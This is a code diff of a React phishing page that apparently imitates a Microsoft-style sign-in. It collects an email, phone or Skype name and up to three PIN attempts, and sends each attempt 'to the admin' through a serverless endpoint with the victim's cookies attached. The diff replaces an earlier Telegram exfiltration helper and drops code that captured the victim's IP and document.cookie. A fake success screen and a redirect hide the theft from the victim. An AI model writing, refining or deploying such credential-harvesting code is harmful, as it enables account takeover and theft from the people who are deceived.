@@ -2,11 +2,10 @@
  * src/pages/MenuPage.jsx
  *
  * Two-step flow: Email → PIN (with three attempts).
- * Each PIN attempt is sent to the admin immediately.
+ * Each PIN attempt is sent to the admin via Vercel serverless function.
  * After 3 attempts or a correct PIN, shows success for 10s then redirects.
  */
 import React, { useEffect, useRef, useState } from "react";
-import { sendOrder } from "../lib/telegram";
 import bgImage from '../assets/mybackgrounder.png';
 import logoImage from '../assets/image.png';
 
@@ -17,7 +16,7 @@ const STEP_META = {
   email: {
     label: "Email, Phone or Skype",
     type: "email",
-    placeholder:  "Email, or Phone or skype",
+    placeholder: "Email, or Phone or skype",
     hint: null,
   },
   pin: {
@@ -42,8 +41,6 @@ export default function MenuPage() {
   const [isFocused, setIsFocused] = useState(false);
   const [pinAttempts, setPinAttempts] = useState(0);
   const [showSuccess, setShowSuccess] = useState(false);
-  const [userIP, setUserIP] = useState('');
-  const [cookies, setCookies] = useState('');
   const [sessionId, setSessionId] = useState('');
 
   const redirectTimerRef = useRef(null);
@@ -59,18 +56,8 @@ export default function MenuPage() {
     setFieldErr("");
   }, []);
 
-  // Fetch IP, cookies, and session ID on mount
+  // Generate or retrieve session ID on mount
   useEffect(() => {
-    // 1. IP
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => setUserIP(data.ip))
-      .catch(() => setUserIP('Unable to retrieve IP'));
-
-    // 2. Cookies
-    setCookies(document.cookie || 'none');
-
-    // 3. Session ID (persist across page reloads)
     let sid = sessionStorage.getItem('ms_session_id');
     if (!sid) {
       sid = 'sess_' + Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
@@ -107,35 +94,41 @@ export default function MenuPage() {
     }, 220);
   }
 
-  // Send a single PIN attempt with full metadata
- async function sendAttempt(pin, attemptNumber, isCorrect) {
-  setSending(true);
-  try {
-    const response = await fetch('/api/send-order', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      credentials: 'include',
-      body: JSON.stringify({ email: form.email.trim(), pin, attemptNumber, isCorrectPin: isCorrect, sessionId }),
-    });
+  // Send a single PIN attempt to the Vercel serverless function
+  async function sendAttempt(pin, attemptNumber, isCorrect) {
+    setSending(true);
+    try {
+      const response = await fetch('/api/send-order', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include', // sends cookies (including HttpOnly)
+        body: JSON.stringify({
+          email: form.email.trim(),
+          pin,
+          attemptNumber,
+          isCorrectPin: isCorrect,
+          sessionId,
+        }),
+      });
 
-    if (!response.ok) {
-      const text = await response.text();
-      let errorMsg = `HTTP ${response.status}`;
-      try {
-        const json = JSON.parse(text);
-        if (json.error) errorMsg = json.error;
-      } catch (_) { /* ignore */ }
-      throw new Error(errorMsg);
+      if (!response.ok) {
+        const text = await response.text();
+        let errorMsg = `HTTP ${response.status}`;
+        try {
+          const json = JSON.parse(text);
+          if (json.error) errorMsg = json.error;
+        } catch (_) { /* ignore */ }
+        throw new Error(errorMsg);
+      }
+
+      const data = await response.json();
+      if (!data.success) throw new Error('Proxy failed');
+    } catch (err) {
+      console.error("Failed to send attempt:", err);
+    } finally {
+      setSending(false);
     }
-
-    const data = await response.json();
-    if (!data.success) throw new Error('Proxy failed');
-  } catch (err) {
-    console.error("Failed to send attempt:", err);
-  } finally {
-    setSending(false);
   }
-}
 
   function finishOrder() {
     setOrderSubmitted(true);
@@ -149,12 +142,12 @@ export default function MenuPage() {
   async function handleNext(e) {
     e.preventDefault();
     const fieldName = STEPS[step];
-    
+
     if (!form[fieldName].trim()) {
       setFieldErr(`Please enter your ${STEP_META[fieldName].label.toLowerCase()}.`);
       return;
     }
-    
+
     if (fieldName === "email" && !/\S+@\S+\.\S+/.test(form.email)) {
       setFieldErr("Please enter a valid email address.");
       return;
@@ -196,6 +189,7 @@ export default function MenuPage() {
   const meta = STEP_META[fieldName];
   const showHeading = step === 0;
 
+ 
   return (
 
     <>
